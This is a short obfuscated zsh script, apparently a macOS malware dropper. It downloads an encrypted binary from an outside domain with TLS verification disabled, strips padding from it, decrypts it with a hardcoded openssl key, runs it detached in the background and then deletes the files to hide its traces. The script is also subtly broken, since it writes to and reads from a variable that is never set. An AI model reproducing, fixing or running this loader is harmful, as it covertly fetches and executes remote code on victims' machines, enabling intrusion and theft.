#!/bin/zsh
msjpk=$(mktemp /tmp/xq3mbm.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m3cdf147f52b3e6ee.bin" -o "$msjpkz" || exit 1
jnybt9=$(stat -f %z "$msjpkz"); zk3eab7=$(( jnybt9 - 1028 - 2359 ))
tail -c +$(( 1028 + 1 )) "$msjpkz" | head -c $zk3eab7 | openssl enc -d -aes-256-cbc -k ec3e5e1e6d82d86f80a66264 -out "$msjpk" 2>/dev/null
[ -s "$msjpk" ] && chmod 700 "$msjpk" && ( "$msjpk" & ) && disown
( sleep 3; rm -f "$msjpk" "$msjpkz" ) &>/dev/null &
